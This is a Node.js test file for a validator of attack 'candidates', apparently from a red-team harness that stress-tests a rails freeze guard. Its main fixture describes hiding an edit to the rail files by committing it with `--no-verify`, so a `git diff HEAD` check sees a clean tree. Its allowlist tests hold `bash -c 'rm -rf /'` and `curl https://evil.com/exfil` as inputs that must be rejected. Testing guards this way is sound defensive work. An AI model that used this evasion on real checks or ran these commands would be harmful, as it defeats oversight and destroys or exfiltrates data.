// §1.2/§2.4 schema validation + §3.3 pinned dedup hash

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateCandidate, normalizeAndHash } from '../lib/candidate.mjs';

// Valid candidate shape
const VALID = {
  id: 'cand-test-1',
  strategy: 'base-ref-window',
  target: 'rails-guard',
  claimKind: 'freeze-integrity',
  rationale: 'commits the rail edit so git diff HEAD sees a clean tree',
  diff: 'diff --git a/rails/foo.md b/rails/foo.md\nindex abc..def 100644\n--- a/rails/foo.md\n+++ b/rails/foo.md\n@@ -1,3 +1,3 @@\n-original\n+mutated',
  witnessProposal: { cmd: 'node', args: ['--test', 'test/freeze.witness.mjs'] },
  setup: [['git', 'add', '-A'], ['git', 'commit', '-m', 'x', '--no-verify']],
};

test('valid candidate passes validation', () => {
  const result = validateCandidate(VALID);
  assert.equal(result.valid, true);
});

test('missing witnessProposal → invalid:malformed', () => {
  const c = { ...VALID };
  delete c.witnessProposal;
  const result = validateCandidate(c);
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:malformed');
});

test('shell-string in setup (not an array of arrays) → invalid:malformed', () => {
  const c = { ...VALID, setup: ['git add -A'] }; // shell string, not argv array
  const result = validateCandidate(c);
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:malformed');
});

test('setup item that is not an array → invalid:malformed', () => {
  const c = { ...VALID, setup: [{ cmd: 'git', args: ['add'] }] };
  const result = validateCandidate(c);
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:malformed');
});

test('missing target → invalid:malformed', () => {
  const c = { ...VALID };
  delete c.target;
  const result = validateCandidate(c);
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:malformed');
});

test('missing diff → invalid:malformed', () => {
  const c = { ...VALID };
  delete c.diff;
  const result = validateCandidate(c);
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:malformed');
});

test('missing claimKind → invalid:malformed', () => {
  const c = { ...VALID };
  delete c.claimKind;
  const result = validateCandidate(c);
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:malformed');
});

test('witnessProposal cmd outside allowlist → invalid:cmd', () => {
  const c = { ...VALID, witnessProposal: { cmd: 'bash', args: ['-c', 'rm -rf /'] } };
  const result = validateCandidate(c, { allowedCmds: new Set(['node', 'git', 'npm', 'npx']) });
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:cmd');
});

test('setup cmd outside allowlist → invalid:cmd', () => {
  const c = { ...VALID, setup: [['curl', 'https://evil.com/exfil']] };
  const result = validateCandidate(c, { allowedCmds: new Set(['node', 'git', 'npm', 'npx']) });
  assert.equal(result.valid, false);
  assert.equal(result.reason, 'invalid:cmd');
});

test('allowed cmds: node, git, npm, npx pass by default', () => {
  for (const cmd of ['node', 'git', 'npm', 'npx']) {
    const c = { ...VALID, witnessProposal: { cmd, args: [] }, setup: [[cmd, 'help']] };
    const result = validateCandidate(c);
    assert.equal(result.valid, true, `Expected ${cmd} to be valid`);
  }
});

// Pinned dedup hash §3.3
test('two diffs differing only in hunk line numbers hash equal', () => {
  const diff1 = `diff --git a/foo.mjs b/foo.mjs
index abc123..def456 100644
--- a/foo.mjs
+++ b/foo.mjs
@@ -1,3 +1,3 @@
 unchanged
-original
+mutated
 also unchanged`;

  const diff2 = `diff --git a/foo.mjs b/foo.mjs
index abc123..def456 100644
--- a/foo.mjs
+++ b/foo.mjs
@@ -10,3 +10,3 @@
 unchanged
-original
+mutated
 also unchanged`;

  const hash1 = normalizeAndHash({ target: 'g', claimKind: 'k', diff: diff1 });
  const hash2 = normalizeAndHash({ target: 'g', claimKind: 'k', diff: diff2 });
  assert.equal(hash1, hash2, 'Hunk line number differences should hash equal');
});

test('two diffs differing only in git blob hashes hash equal', () => {
  const diff1 = `diff --git a/foo.mjs b/foo.mjs
index aaa111..bbb222 100644
--- a/foo.mjs
+++ b/foo.mjs
@@ -1,1 +1,1 @@
-original
+mutated`;

  const diff2 = `diff --git a/foo.mjs b/foo.mjs
index ccc333..ddd444 100644
--- a/foo.mjs
+++ b/foo.mjs
@@ -1,1 +1,1 @@
-original
+mutated`;

  const hash1 = normalizeAndHash({ target: 'g', claimKind: 'k', diff: diff1 });
  const hash2 = normalizeAndHash({ target: 'g', claimKind: 'k', diff: diff2 });
  assert.equal(hash1, hash2, 'Blob hash differences should hash equal');
});

test('two genuinely different diffs hash differently', () => {
  const diff1 = `diff --git a/foo.mjs b/foo.mjs
@@ -1,1 +1,1 @@
-original
+mutated`;

  const diff2 = `diff --git a/bar.mjs b/bar.mjs
@@ -1,1 +1,1 @@
-original
+different`;

  const hash1 = normalizeAndHash({ target: 'g', claimKind: 'k', diff: diff1 });
  const hash2 = normalizeAndHash({ target: 'g', claimKind: 'k', diff: diff2 });
  assert.notEqual(hash1, hash2, 'Different diffs should have different hashes');
});

test('different target or claimKind produces different hash (same diff)', () => {
  const diff = `diff --git a/foo.mjs b/foo.mjs\n@@ -1,1 +1,1 @@\n-a\n+b`;
  const h1 = normalizeAndHash({ target: 'gate-a', claimKind: 'kind-x', diff });
  const h2 = normalizeAndHash({ target: 'gate-b', claimKind: 'kind-x', diff });
  assert.notEqual(h1, h2);
});
